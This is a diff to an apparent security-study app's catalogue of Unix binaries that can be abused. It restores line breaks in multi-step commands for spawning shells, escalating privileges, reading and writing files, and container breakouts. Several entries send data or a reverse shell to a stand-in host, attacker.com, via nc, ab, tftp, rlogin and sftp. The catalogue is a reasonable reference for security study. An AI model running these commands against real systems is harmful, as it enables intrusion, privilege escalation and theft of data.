@@ -1069,7 +1069,7 @@ const TRACKS=[
 ]}
 ];
 
-const APP_VERSION="1.7.0";
+const APP_VERSION="1.7.1";
 
 // ---------- storage ----------
 // Everything lives in localStorage, so a private window or a full quota loses
@@ -2718,20 +2718,20 @@ const GTFO=[
 {n:"R",f:"shell",b:"shell",s:"t",c:"R --no-save -e 'system(\"/bin/sh\")'"},
 {n:"aa-exec",f:"shell",b:"shell",c:"aa-exec /bin/sh"},
 {n:"ab",f:"upload,download",b:"upload",c:"ab -p /path/to/input-file http://attacker.com/"},
-{n:"acr",f:"cmd",b:"cmd",s:"t",c:"echo -e 'x:\\n\\t/bin/sh 1>&0 2>&0' >/path/to/temp-file chmod +x /path/to/temp-file"},
+{n:"acr",f:"cmd",b:"cmd",s:"t",c:"echo -e 'x:\\n\\t/bin/sh 1>&0 2>&0' >/path/to/temp-file\nchmod +x /path/to/temp-file\nacr -r ./relative/path/to/temp-file"},
 {n:"agetty",f:"shell",b:"shell",s:"f",c:"agetty -l /bin/sh -o -p -a root tty"},
 {n:"alpine",f:"read",b:"read",c:"alpine -F /path/to/input-file"},
 {n:"apache2",f:"read",b:"read",c:"apache2 -f /path/to/input-file"},
-{n:"apt-get",f:"shell",b:"shell",s:"t",c:"echo 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' >/path/to/temp-file apt-get -y install -c /path/to/temp-file sl"},
-{n:"ar",f:"read",b:"read",c:"ar r /path/to/output-file /path/to/input-file ar p /path/to/output-file"},
-{n:"aria2c",f:"cmd,read,download",b:"cmd",s:"t",c:"echo /path/to/command >/path/to/temp-file chmod +x /path/to/temp-file"},
-{n:"arj",f:"write,read",b:"write",c:"echo DATA >output-file arj a x output-file"},
+{n:"apt-get",f:"shell",b:"shell",s:"t",c:"echo 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' >/path/to/temp-file\napt-get -y install -c /path/to/temp-file sl"},
+{n:"ar",f:"read",b:"read",c:"ar r /path/to/output-file /path/to/input-file\nar p /path/to/output-file"},
+{n:"aria2c",f:"cmd,read,download",b:"cmd",s:"t",c:"echo /path/to/command >/path/to/temp-file\nchmod +x /path/to/temp-file\naria2c --on-download-error=/path/to/temp-file http://some-invalid-domain"},
+{n:"arj",f:"write,read",b:"write",c:"echo DATA >output-file\narj a x output-file\narj e x /path/to/output-dir/"},
 {n:"arp",f:"read",b:"read",c:"arp -v -f /path/to/input-file"},
 {n:"as",f:"read",b:"read",c:"as @/path/to/input-file"},
 {n:"ascii-xfr",f:"read",b:"read",c:"ascii-xfr -ns /path/to/input-file"},
 {n:"ash",f:"shell,write",b:"shell",c:"ash -p"},
 {n:"aspell",f:"read",b:"read",c:"aspell -c /path/to/input-file"},
-{n:"asterisk",f:"shell",b:"shell",s:"t",c:"asterisk -r !/bin/sh"},
+{n:"asterisk",f:"shell",b:"shell",s:"t",c:"asterisk -r\n!/bin/sh"},
 {n:"atobm",f:"read",b:"read",c:"atobm /path/to/input-file"},
 {n:"aws",f:"read",b:"read",c:"aws ec2 describe-instances --filter file:///path/to/input-file"},
 {n:"base32",f:"read",b:"read",c:"base32 /path/to/input-file | base32 --decode"},
@@ -2740,7 +2740,7 @@ const GTFO=[
 {n:"basez",f:"read",b:"read",c:"basez /path/to/input-file | basez --decode"},
 {n:"bash",f:"shell,lib,write,read,revsh,upload,download",b:"shell",c:"bash -p"},
 {n:"batcat",f:"inherit",b:"inherit",c:"batcat --paging always /etc/hosts"},
-{n:"bc",f:"read",b:"read",c:"bc -s /path/to/input-file quit"},
+{n:"bc",f:"read",b:"read",c:"bc -s /path/to/input-file\nquit"},
 {n:"bconsole",f:"read",b:"read",c:"bconsole -c /path/to/file-input"},
 {n:"bee",f:"inherit",b:"inherit",c:"bee eval '...'"},
 {n:"bridge",f:"read",b:"read",c:"bridge -b /path/to/input-file"},
@@ -2756,18 +2756,18 @@ const GTFO=[
 {n:"chown",f:"privesc",b:"privesc",c:"chown $(id -un):$(id -gn) /path/to/input-file"},
 {n:"chroot",f:"shell",b:"shell",s:"f",c:"chroot / /bin/sh -p"},
 {n:"chrt",f:"shell",b:"shell",s:"f",c:"chrt 1 /bin/sh -p"},
-{n:"clamscan",f:"read",b:"read",c:"touch x.yara clamscan --no-summary -d x.yara -f /path/to/input-file 2>&1 | sed -nE 's/^(.*): No such file or directory$/\\1/p'"},
+{n:"clamscan",f:"read",b:"read",c:"touch x.yara\nclamscan --no-summary -d x.yara -f /path/to/input-file 2>&1 | sed -nE 's/^(.*): No such file or directory$/\\1/p'"},
 {n:"clisp",f:"shell",b:"shell",s:"t",c:"clisp -x '(ext:run-shell-command \"/bin/sh\")(ext:exit)'"},
 {n:"cmp",f:"read",b:"read",c:"cmp /path/to/input-file /dev/zero -b -l"},
-{n:"cobc",f:"shell",b:"shell",s:"t",c:"echo 'CALL \"SYSTEM\" USING \"/bin/sh\".' >/path/to/temp-file cobc -xFj --frelax-syntax-checks /path/to/temp-file"},
+{n:"cobc",f:"shell",b:"shell",s:"t",c:"echo 'CALL \"SYSTEM\" USING \"/bin/sh\".' >/path/to/temp-file\ncobc -xFj --frelax-syntax-checks /path/to/temp-file"},
 {n:"column",f:"read",b:"read",c:"column /path/to/input-file"},
 {n:"comm",f:"read",b:"read",c:"comm /path/to/input-file /dev/null"},
 {n:"cp",f:"privesc,write,read",b:"privesc",c:"cp /path/to/input-file /path/to/output-file"},
-{n:"cpio",f:"write,read",b:"write",c:"echo DATA >/path/to/temp-file echo /path/to/temp-file | cpio -R 0:0 -udp ."},
+{n:"cpio",f:"write,read",b:"write",c:"echo DATA >/path/to/temp-file\necho /path/to/temp-file | cpio -R 0:0 -udp ."},
 {n:"cpulimit",f:"shell",b:"shell",c:"cpulimit -l 100 -f -- /bin/sh -p"},
 {n:"crash",f:"inherit",b:"inherit",c:"crash -h"},
 {n:"csh",f:"shell,write",b:"shell",c:"csh -b"},
-{n:"csplit",f:"write,read",b:"write",c:"echo DATA >/path/to/temp-file csplit -z -b '%doutput-file' /path/to/temp-file 1"},
+{n:"csplit",f:"write,read",b:"write",c:"echo DATA >/path/to/temp-file\ncsplit -z -b '%doutput-file' /path/to/temp-file 1"},
 {n:"csvtool",f:"shell,write,read",b:"shell",s:"t",c:"csvtool call '/bin/sh;false' /etc/hosts"},
 {n:"ctr",f:"shell",b:"shell",c:"ctr run --rm --mount type=bind,src=/,dst=/,options=rbind -t docker.io/library/alpine:latest x"},
 {n:"cupsfilter",f:"read",b:"read",c:"cupsfilter -i application/octet-stream -m application/octet-stream /path/to/input-file"},
@@ -2777,21 +2777,21 @@ const GTFO=[
 {n:"date",f:"read",b:"read",c:"date -f /path/to/input-file"},
 {n:"dc",f:"shell",b:"shell",s:"t",c:"dc -e '!/bin/sh'"},
 {n:"dd",f:"write,read",b:"write",c:"echo DATA | dd of=/path/to/output-file"},
-{n:"debugfs",f:"shell",b:"shell",s:"t",c:"debugfs !/bin/sh"},
+{n:"debugfs",f:"shell",b:"shell",s:"t",c:"debugfs\n!/bin/sh"},
 {n:"dialog",f:"read",b:"read",c:"dialog --textbox /path/to/input-file 0 0"},
 {n:"diff",f:"read",b:"read",c:"diff --line-format=%L /dev/null /path/to/input-file"},
 {n:"dig",f:"read",b:"read",c:"dig -f /path/to/input-file"},
 {n:"distcc",f:"shell",b:"shell",c:"distcc /bin/sh -p"},
 {n:"dmesg",f:"read,inherit",b:"read",c:"dmesg -rF /path/to/input-file"},
-{n:"dmsetup",f:"shell",b:"shell",c:"dmsetup create base <<EOF 0 3534848 linear /dev/loop0 94208"},
+{n:"dmsetup",f:"shell",b:"shell",c:"dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\ndmsetup ls --exec '/bin/sh -p -s'"},
 {n:"dnsmasq",f:"cmd",b:"cmd",s:"t",c:"dnsmasq --conf-script='/path/to/command 1>&2'"},
 {n:"docker",f:"shell,write,read",b:"shell",c:"docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh"},
 {n:"dos2unix",f:"write,read",b:"write",c:"dos2unix -f -n /path/to/input-file /path/to/output-file"},
 {n:"dosbox",f:"write,read",b:"write",c:"dosbox -c 'mount c /' -c \"echo DATA >c:\\path\\to\\output\" -c exit"},
 {n:"dpkg",f:"inherit",b:"inherit",c:"dpkg -l"},
 {n:"dvips",f:"shell",b:"shell",s:"t",c:"dvips -R0 texput.dvi"},
-{n:"easyrsa",f:"shell",b:"shell",s:"t",c:"echo 'set_var X \"$(/bin/sh 1>&0)\"' >/path/to/temp-file easyrsa --vars=/path/to/temp-file"},
-{n:"ed",f:"shell,write,read",b:"shell",s:"t",c:"ed !/bin/sh"},
+{n:"easyrsa",f:"shell",b:"shell",s:"t",c:"echo 'set_var X \"$(/bin/sh 1>&0)\"' >/path/to/temp-file\neasyrsa --vars=/path/to/temp-file"},
+{n:"ed",f:"shell,write,read",b:"shell",s:"t",c:"ed\n!/bin/sh\nq"},
 {n:"efax",f:"read",b:"read",c:"efax -d /path/to/input-file"},
 {n:"egrep",f:"read",b:"read",c:"grep '' /path/to/input-file"},
 {n:"elvish",f:"shell,write,read",b:"shell",c:"elvish"},
@@ -2802,8 +2802,8 @@ const GTFO=[
 {n:"ex",f:"shell,inherit",b:"shell",s:"t",c:"ex -c ':!/bin/sh'"},
 {n:"expand",f:"read",b:"read",c:"expand /path/to/input-file"},
 {n:"expect",f:"shell,read",b:"shell",s:"f",c:"expect -c 'spawn /bin/sh -p;interact'"},
-{n:"fastfetch",f:"shell,cmd,read",b:"shell",s:"t",c:"echo '{\"modules\":[{\"type\":\"command\",\"key\":\"x\",\"text\":\"exec /bin/sh 1>&0 2>&0\"}]}' >/path/to/temp-file.jsonc fastfetch -c /path/to/temp-file.jsonc"},
-{n:"ffmpeg",f:"lib",b:"lib",c:"ffmpeg -f lavfi -i anullsrc -af ladspa=file=/path/to/lib.so /path/to/temp-file.wav reset^J"},
+{n:"fastfetch",f:"shell,cmd,read",b:"shell",s:"t",c:"echo '{\"modules\":[{\"type\":\"command\",\"key\":\"x\",\"text\":\"exec /bin/sh 1>&0 2>&0\"}]}' >/path/to/temp-file.jsonc\nfastfetch -c /path/to/temp-file.jsonc"},
+{n:"ffmpeg",f:"lib",b:"lib",c:"ffmpeg -f lavfi -i anullsrc -af ladspa=file=/path/to/lib.so /path/to/temp-file.wav\nreset^J"},
 {n:"fgrep",f:"read",b:"read",c:"grep '' /path/to/input-file"},
 {n:"file",f:"read",b:"read",c:"file -f /path/to/input-file"},
 {n:"find",f:"shell,write,read",b:"shell",s:"f",c:"find . -exec /bin/sh -p \\; -quit"},
@@ -2812,9 +2812,9 @@ const GTFO=[
 {n:"flock",f:"shell",b:"shell",s:"f",c:"flock -u / /bin/sh -p"},
 {n:"fmt",f:"read",b:"read",c:"fmt -pNON_EXISTING_PREFIX /path/to/input-file"},
 {n:"fold",f:"read",b:"read",c:"fold -w999 /path/to/input-file"},
-{n:"forge",f:"shell",b:"shell",c:"echo '#!/bin/sh' >/path/to/temp-file echo -e \"/bin/sh <$(tty) >$(tty) 2>$(tty)\" >>/path/to/temp-file"},
+{n:"forge",f:"shell",b:"shell",c:"echo '#!/bin/sh' >/path/to/temp-file\necho -e \"/bin/sh <$(tty) >$(tty) 2>$(tty)\" >>/path/to/temp-file\nchmod +x /path/to/temp-file\nforge build --use /path/to/temp-file"},
 {n:"fping",f:"read",b:"read",c:"fping -f /path/to/input-file"},
-{n:"ftp",f:"shell,upload,download",b:"shell",s:"t",c:"ftp !/bin/sh"},
+{n:"ftp",f:"shell,upload,download",b:"shell",s:"t",c:"ftp\n!/bin/sh"},
 {n:"fzf",f:"shell,cmd",b:"shell",s:"t",c:"fzf --bind 'enter:execute(/bin/sh)'"},
 {n:"gawk",f:"shell,write,read,revsh,bindsh",b:"shell",s:"t",c:"gawk 'BEGIN {system(\"/bin/sh\")}'"},
 {n:"gcloud",f:"inherit",b:"inherit",c:"gcloud help"},
@@ -2823,25 +2823,25 @@ const GTFO=[
 {n:"genie",f:"shell",b:"shell",c:"genie -c '/bin/sh'"},
 {n:"genisoimage",f:"read",b:"read",c:"genisoimage -q -o - /path/to/input-file"},
 {n:"getent",f:"privesc",b:"privesc",c:"getent shadow"},
-{n:"ginsh",f:"shell",b:"shell",s:"t",c:"ginsh !/bin/sh"},
-{n:"git",f:"shell,write,read",b:"shell",s:"f",c:"ln -s /bin/sh git-x git --exec-path=. x -p"},
+{n:"ginsh",f:"shell",b:"shell",s:"t",c:"ginsh\n!/bin/sh"},
+{n:"git",f:"shell,write,read",b:"shell",s:"f",c:"ln -s /bin/sh git-x\ngit --exec-path=. x -p"},
 {n:"gnuplot",f:"shell",b:"shell",s:"t",c:"gnuplot -e 'system(\"/bin/sh 1>&0\")'"},
 {n:"grep",f:"read",b:"read",c:"grep '' /path/to/input-file"},
-{n:"gtester",f:"shell,write",b:"shell",s:"f",c:"echo '#!/bin/sh -p' >/path/to/temp-file echo 'exec /bin/sh -p 0<&1' >>/path/to/temp-file"},
+{n:"gtester",f:"shell,write",b:"shell",s:"f",c:"echo '#!/bin/sh -p' >/path/to/temp-file\necho 'exec /bin/sh -p 0<&1' >>/path/to/temp-file\nchmod +x /path/to/temp-file\ngtester -q /path/to/temp-file"},
 {n:"guile",f:"shell",b:"shell",s:"t",c:"guile -c '(system \"/bin/sh\")'"},
 {n:"gzip",f:"read",b:"read",c:"gzip -c /path/to/input-file | gzip -d"},
 {n:"head",f:"read",b:"read",c:"head -c-0 /path/to/input-file"},
 {n:"hexdump",f:"read",b:"read",c:"hd /path/to/input-file"},
 {n:"hg",f:"shell",b:"shell",s:"t",c:"hg --config alias.x='!/bin/sh' x"},
 {n:"highlight",f:"read",b:"read",c:"highlight --no-doc --failsafe /path/to/input-file"},
-{n:"hping3",f:"shell",b:"shell",s:"f",c:"hping3 /bin/sh -p"},
+{n:"hping3",f:"shell",b:"shell",s:"f",c:"hping3\n/bin/sh -p"},
 {n:"iconv",f:"write,read",b:"write",c:"echo DATA | iconv -f 8859_1 -t 8859_1 -o /path/to/output-file"},
-{n:"iftop",f:"shell",b:"shell",s:"t",c:"iftop !/bin/sh"},
+{n:"iftop",f:"shell",b:"shell",s:"t",c:"iftop\n!/bin/sh"},
 {n:"install",f:"privesc",b:"privesc",c:"install -m 6777 /path/to/input-file /path/to/output-dir/"},
 {n:"ionice",f:"shell",b:"shell",s:"f",c:"ionice /bin/sh -p"},
-{n:"ip",f:"shell,read",b:"shell",c:"ip netns add foo ip netns exec foo /bin/sh -p"},
-{n:"ispell",f:"shell",b:"shell",s:"f",c:"ispell /etc/hosts !/bin/sh -p"},
-{n:"joe",f:"shell",b:"shell",s:"t",c:"joe ^K!/bin/sh"},
+{n:"ip",f:"shell,read",b:"shell",c:"ip netns add foo\nip netns exec foo /bin/sh -p\nip netns delete foo"},
+{n:"ispell",f:"shell",b:"shell",s:"f",c:"ispell /etc/hosts\n!/bin/sh -p"},
+{n:"joe",f:"shell",b:"shell",s:"t",c:"joe\n^K!/bin/sh"},
 {n:"join",f:"read",b:"read",c:"join -a 2 /dev/null /path/to/input-file"},
 {n:"jq",f:"read",b:"read",c:"jq -Rr . /path/to/input-file"},
 {n:"jrunscript",f:"shell",b:"shell",s:"f",c:"jrunscript -e 'exec(\"/bin/sh -pc $@|sh$IFS-p _ echo sh -p </dev/tty >/dev/tty 2>/dev/tty\")'"},
@@ -2851,8 +2851,8 @@ const GTFO=[
 {n:"last",f:"read",b:"read",c:"last -a -f /path/to/input-file"},
 {n:"latex",f:"shell,write,read",b:"shell",s:"t",c:"latex --shell-escape '\\immediate\\write18{/bin/sh}'"},
 {n:"ld.so",f:"shell",b:"shell",s:"f",c:"/path/to/ld.so /bin/sh -p"},
-{n:"ldconfig",f:"lib",b:"lib",c:"echo /path/to/temp-dir/ >/path/to/temp-file ldconfig -f /path/to/temp-file"},
-{n:"less",f:"shell,write,read,inherit",b:"shell",s:"t",c:"less /etc/hosts !/bin/sh"},
+{n:"ldconfig",f:"lib",b:"lib",c:"echo /path/to/temp-dir/ >/path/to/temp-file\nldconfig -f /path/to/temp-file\nping"},
+{n:"less",f:"shell,write,read,inherit",b:"shell",s:"t",c:"less /etc/hosts\n!/bin/sh"},
 {n:"lftp",f:"shell",b:"shell",s:"t",c:"lftp -c '!/bin/sh'"},
 {n:"links",f:"read",b:"read",c:"links /path/to/input-file"},
 {n:"logrotate",f:"write,read",b:"write",c:"logrotate -l /path/to/output-file DATA"},
@@ -2863,14 +2863,14 @@ const GTFO=[
 {n:"lua",f:"shell,write,read,revsh,bindsh,upload,download",b:"shell",s:"t",c:"lua -e 'os.execute(\"/bin/sh\")'"},
 {n:"lualatex",f:"inherit",b:"inherit",c:"lualatex -shell-escape '\\directlua{...}\\end'"},
 {n:"luatex",f:"inherit",b:"inherit",c:"luatex -shell-escape '\\directlua{...}\\end'"},
-{n:"lxd",f:"shell",b:"shell",c:"lxc init ubuntu:16.04 x -c security.privileged=true lxc config device add x x disk source=/ path=/mnt/ recursive=true"},
+{n:"lxd",f:"shell",b:"shell",c:"lxc init ubuntu:16.04 x -c security.privileged=true\nlxc config device add x x disk source=/ path=/mnt/ recursive=true\nlxc start x\nlxc exec x /bin/sh"},
 {n:"m4",f:"shell,cmd,read",b:"shell",s:"t",c:"echo 'esyscmd(/bin/sh 0<&2 1>&2)' | m4"},
 {n:"mail",f:"shell",b:"shell",s:"t",c:"mail --exec='!/bin/sh'"},
 {n:"make",f:"shell,write,read",b:"shell",s:"t",c:"make --eval='$(shell /bin/sh 1>&0)' ."},
 {n:"man",f:"shell,read,inherit",b:"shell",s:"t",c:"man '-H/bin/sh #' man"},
 {n:"mawk",f:"shell,write,read",b:"shell",s:"t",c:"mawk 'BEGIN {system(\"/bin/sh\")}'"},
 {n:"minicom",f:"shell",b:"shell",c:"minicom -D /dev/null"},
-{n:"more",f:"shell,read",b:"shell",s:"t",c:"more /etc/hosts !/bin/sh"},
+{n:"more",f:"shell,read",b:"shell",s:"t",c:"more /etc/hosts\n!/bin/sh"},
 {n:"mosquitto",f:"read",b:"read",c:"mosquitto -c /path/to/input-file"},
 {n:"msgattrib",f:"read",b:"read",c:"msgattrib -P /path/to/input-file"},
 {n:"msgcat",f:"read",b:"read",c:"msgcat -P /path/to/input-file"},
@@ -2881,23 +2881,23 @@ const GTFO=[
 {n:"multitime",f:"shell",b:"shell",c:"multitime /bin/sh -p"},
 {n:"mv",f:"privesc,write",b:"privesc",c:"mv /path/to/input-file /path/to/output-file"},
 {n:"mysql",f:"shell,lib",b:"shell",s:"t",c:"mysql -e '\\! /bin/sh'"},
-{n:"nano",f:"shell,write,read",b:"shell",s:"t",c:"nano ^R^X"},
+{n:"nano",f:"shell,write,read",b:"shell",s:"t",c:"nano\n^R^X\nreset; sh 1>&0 2>&0"},
 {n:"nasm",f:"read",b:"read",c:"nasm -@ /path/to/input-file"},
 {n:"nc",f:"revsh,bindsh,upload,download",b:"revsh",s:"t",c:"nc -e /bin/sh attacker.com 12345"},
-{n:"ncdu",f:"shell",b:"shell",s:"t",c:"ncdu b"},
-{n:"ncftp",f:"shell",b:"shell",s:"t",c:"ncftp !/bin/sh -p"},
-{n:"nginx",f:"lib",b:"lib",c:"cat >/path/to/temp-file <<EOF load_module /path/to/lib.so;"},
+{n:"ncdu",f:"shell",b:"shell",s:"t",c:"ncdu\nb"},
+{n:"ncftp",f:"shell",b:"shell",s:"t",c:"ncftp\n!/bin/sh -p"},
+{n:"nginx",f:"lib",b:"lib",c:"cat >/path/to/temp-file <<EOF\nload_module /path/to/lib.so;\nEOF\n\nnginx -t -c /path/to/temp-file"},
 {n:"nice",f:"shell",b:"shell",s:"f",c:"nice /bin/sh -p"},
 {n:"nl",f:"read",b:"read",c:"nl -bn -w1 -s '' /path/to/input-file"},
 {n:"nm",f:"read",b:"read",c:"nm /path/to/input-file"},
-{n:"nmap",f:"shell,write,read,inherit",b:"shell",s:"t",c:"nmap --interactive !/bin/sh"},
+{n:"nmap",f:"shell,write,read,inherit",b:"shell",s:"t",c:"nmap --interactive\n!/bin/sh"},
 {n:"node",f:"shell,write,read,revsh,bindsh,upload,download",b:"shell",c:"node -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: [0, 1, 2]})'"},
 {n:"nohup",f:"shell,cmd",b:"shell",s:"f",c:"nohup /bin/sh -p -c '/bin/sh -p </dev/tty >/dev/tty 2>/dev/tty'"},
 {n:"nsenter",f:"shell",b:"shell",s:"f",c:"nsenter /bin/sh -p"},
 {n:"ntpdate",f:"read",b:"read",c:"ntpdate -a x -k /path/to/input-file -d localhost"},
 {n:"octave",f:"shell,write,read",b:"shell",s:"t",c:"octave-cli --eval 'system(\"/bin/sh\")'"},
 {n:"od",f:"read",b:"read",c:"od -An -c -w999 /path/to/input-file"},
-{n:"opencode",f:"cmd",b:"cmd",s:"t",c:"opencode ! /path/to/command"},
+{n:"opencode",f:"cmd",b:"cmd",s:"t",c:"opencode\n! /path/to/command"},
 {n:"openssl",f:"lib,write,read,revsh,upload,download",b:"lib",c:"openssl req -engine ./lib.so"},
 {n:"openvpn",f:"shell,read",b:"shell",s:"f",c:"openvpn --dev null --script-security 2 --up '/bin/sh -p -s'"},
 {n:"pandoc",f:"write,read,inherit",b:"write",c:"echo DATA | pandoc -t plain -o /path/to/output-file"},
@@ -2908,20 +2908,20 @@ const GTFO=[
 {n:"perf",f:"shell",b:"shell",s:"f",c:"perf stat /bin/sh -p"},
 {n:"perl",f:"read",b:"read",c:"perl -ne print /path/to/input-file"},
 {n:"pexec",f:"shell",b:"shell",s:"f",c:"pexec /bin/sh -p"},
-{n:"pg",f:"shell,read",b:"shell",s:"t",c:"pg /etc/hosts !/bin/sh"},
+{n:"pg",f:"shell,read",b:"shell",s:"t",c:"pg /etc/hosts\n!/bin/sh"},
 {n:"php",f:"shell,cmd,write,read,revsh,upload,download",b:"shell",s:"t",c:"php -r 'system(\"/bin/sh -i\");'"},
-{n:"pic",f:"shell,read",b:"shell",s:"t",c:"pic -U .PS"},
+{n:"pic",f:"shell,read",b:"shell",s:"t",c:"pic -U\n.PS\nsh X sh X"},
 {n:"pidstat",f:"shell",b:"shell",s:"f",c:"pidstat -e /bin/sh -p"},
 {n:"plymouth",f:"shell",b:"shell",s:"f",c:"plymouth ask-for-password --prompt=x --command='/bin/sh -p'"},
 {n:"pr",f:"read",b:"read",c:"pr -T /path/to/input-file"},
-{n:"psftp",f:"shell",b:"shell",s:"t",c:"psftp !/bin/sh"},
-{n:"psql",f:"shell,inherit",b:"shell",s:"t",c:"psql \\! /bin/sh"},
+{n:"psftp",f:"shell",b:"shell",s:"t",c:"psftp\n!/bin/sh"},
+{n:"psql",f:"shell,inherit",b:"shell",s:"t",c:"psql\n\\! /bin/sh"},
 {n:"ptx",f:"read",b:"read",c:"ptx -w 999 /path/to/input-file"},
 {n:"python",f:"shell,lib,write,read,revsh,upload,download",b:"shell",s:"f",c:"python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"},
-{n:"qpdf",f:"read",b:"read",c:"qpdf --empty --add-attachment /path/to/input-file --key=x -- /path/to/output-file qpdf --show-attachment=x /path/to/output-file"},
+{n:"qpdf",f:"read",b:"read",c:"qpdf --empty --add-attachment /path/to/input-file --key=x -- /path/to/output-file\nqpdf --show-attachment=x /path/to/output-file"},
 {n:"rc",f:"shell",b:"shell",c:"rc"},
 {n:"readelf",f:"read",b:"read",c:"readelf -a @/path/to/input-file"},
-{n:"redis",f:"write",b:"write",c:"redis-cli -h 127.0.0.1 config set dir /path/to/output-dir/"},
+{n:"redis",f:"write",b:"write",c:"redis-cli -h 127.0.0.1\nconfig set dir /path/to/output-dir/\nconfig set dbfilename output-file\nset x \"DATA\"\nsave"},
 {n:"restic",f:"shell,cmd,upload",b:"shell",c:"RESTIC_PASSWORD_COMMAND='/bin/sh -p -c \"/bin/sh -p 0<&2 1<&2\"' restic backup"},
 {n:"rev",f:"read",b:"read",c:"rev /path/to/input-file | rev"},
 {n:"rlogin",f:"upload",b:"upload",c:"rlogin -l DATA -p 12345 attacker.com"},
@@ -2931,12 +2931,12 @@ const GTFO=[
 {n:"rpmquery",f:"shell,inherit",b:"shell",s:"t",c:"rpmquery --eval '%(/bin/sh 1>&2)'"},
 {n:"rpmverify",f:"shell,inherit",b:"shell",s:"t",c:"rpmverify --eval '%(/bin/sh 1>&2)'"},
 {n:"rsync",f:"shell",b:"shell",s:"f",c:"rsync -e '/bin/sh -p -c \"/bin/sh -p 0<&2 1>&2\"' x:x"},
-{n:"rtorrent",f:"shell",b:"shell",s:"f",c:"echo 'execute = /bin/sh,-p,-c,\"/bin/sh -p </dev/tty >/dev/tty 2>/dev/tty\"' >~/.rtorrent.rc rtorrent"},
+{n:"rtorrent",f:"shell",b:"shell",s:"f",c:"echo 'execute = /bin/sh,-p,-c,\"/bin/sh -p </dev/tty >/dev/tty 2>/dev/tty\"' >~/.rtorrent.rc\nrtorrent"},
 {n:"run-parts",f:"shell",b:"shell",s:"f",c:"run-parts --new-session --regex '^sh$' /bin --arg='-p'"},
-{n:"runscript",f:"shell",b:"shell",s:"t",c:"echo '! exec /bin/sh' >/path/to/temp-file runscript /path/to/temp-file"},
+{n:"runscript",f:"shell",b:"shell",s:"t",c:"echo '! exec /bin/sh' >/path/to/temp-file\nrunscript /path/to/temp-file"},
 {n:"sash",f:"shell",b:"shell",c:"sash"},
-{n:"scanmem",f:"shell",b:"shell",s:"t",c:"scanmem shell /bin/sh"},
-{n:"scp",f:"shell,upload,download",b:"shell",s:"t",c:"echo 'exec /bin/sh 0<&2 1>&2' >/path/to/temp-file chmod +x /path/to/temp-file"},
+{n:"scanmem",f:"shell",b:"shell",s:"t",c:"scanmem\nshell /bin/sh"},
+{n:"scp",f:"shell,upload,download",b:"shell",s:"t",c:"echo 'exec /bin/sh 0<&2 1>&2' >/path/to/temp-file\nchmod +x /path/to/temp-file\nscp -S /path/to/temp-file x x:"},
 {n:"script",f:"shell,write",b:"shell",s:"t",c:"script -q /dev/null"},
 {n:"scrot",f:"shell",b:"shell",s:"t",c:"scrot -e /bin/sh"},
 {n:"sed",f:"shell,write,read",b:"shell",s:"t",c:"sed -n '1e exec /bin/sh 1>&0' /etc/hosts"},
@@ -2944,7 +2944,7 @@ const GTFO=[
 {n:"setcap",f:"privesc",b:"privesc",c:"setcap cap_setuid+ep /path/to/command"},
 {n:"setfacl",f:"privesc",b:"privesc",c:"setfacl -m u:$(id -un):rwx /path/to/input-file"},
 {n:"setlock",f:"shell",b:"shell",s:"t",c:"setlock - /bin/sh -p"},
-{n:"sftp",f:"shell,upload,download",b:"shell",s:"t",c:"sftp user@attacker.com !/bin/sh"},
+{n:"sftp",f:"shell,upload,download",b:"shell",s:"t",c:"sftp user@attacker.com\n!/bin/sh"},
 {n:"shred",f:"write",b:"write",c:"shred -u /path/to/output-file"},
 {n:"shuf",f:"write,read",b:"write",c:"shuf -e DATA -o /path/to/output-file"},
 {n:"slsh",f:"shell",b:"shell",s:"t",c:"slsh -e 'system(\"/bin/sh\")'"},
@@ -2966,22 +2966,22 @@ const GTFO=[
 {n:"strace",f:"shell",b:"shell",s:"f",c:"strace -o /dev/null /bin/sh -p"},
 {n:"strings",f:"read",b:"read",c:"strings /path/to/input-file"},
 {n:"sysctl",f:"cmd,read",b:"cmd",c:"sysctl 'kernel.core_pattern=|/path/to/command'"},
-{n:"systemctl",f:"shell,inherit",b:"shell",c:"echo '[Service] Type=oneshot"},
+{n:"systemctl",f:"shell,inherit",b:"shell",c:"echo '[Service]\nType=oneshot\nExecStart=/path/to/command\n[Install]\nWantedBy=multi-user.target' >/path/to/temp-file.service\nsystemctl link /path/to/temp-file.service\nsystemctl enable --now /path/to/temp-file.service"},
 {n:"tac",f:"read",b:"read",c:"tac -s 'RANDOM' /path/to/input-file"},
 {n:"tail",f:"read",b:"read",c:"tail -c+0 /path/to/input-file"},
 {n:"tar",f:"shell,write,read,upload,download",b:"shell",s:"t",c:"tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"},
 {n:"task",f:"shell",b:"shell",s:"t",c:"task execute /bin/sh"},
-{n:"tasksh",f:"shell",b:"shell",s:"t",c:"tasksh !/bin/sh"},
+{n:"tasksh",f:"shell",b:"shell",s:"t",c:"tasksh\n!/bin/sh"},
 {n:"tbl",f:"read",b:"read",c:"tbl /path/to/input-file"},
 {n:"tclsh",f:"shell,lib,revsh",b:"shell",c:"tclsh"},
 {n:"tcpdump",f:"write",b:"write",c:"tcpdump -ln -i lo -w /path/to/output-file -c 1 -Z user"},
 {n:"tcsh",f:"shell,write",b:"shell",c:"tcsh -b"},
-{n:"tdbtool",f:"shell",b:"shell",s:"t",c:"tdbtool ! /bin/sh"},
+{n:"tdbtool",f:"shell",b:"shell",s:"t",c:"tdbtool\n! /bin/sh"},
 {n:"tee",f:"write",b:"write",c:"echo DATA | tee /path/to/output-file"},
-{n:"telnet",f:"shell,revsh",b:"shell",s:"t",c:"telnet !/bin/sh"},
-{n:"terraform",f:"read",b:"read",c:"terraform console file(\"/path/to/input-file\")"},
+{n:"telnet",f:"shell,revsh",b:"shell",s:"t",c:"telnet\n!/bin/sh"},
+{n:"terraform",f:"read",b:"read",c:"terraform console\nfile(\"/path/to/input-file\")"},
 {n:"tex",f:"shell",b:"shell",s:"t",c:"tex --shell-escape '\\immediate\\write18{/bin/sh}'"},
-{n:"tftp",f:"upload,download",b:"upload",c:"tftp attacker.com put /path/to/input-file"},
+{n:"tftp",f:"upload,download",b:"upload",c:"tftp attacker.com\nput /path/to/input-file"},
 {n:"tic",f:"read",b:"read",c:"tic -C /path/to/input-file"},
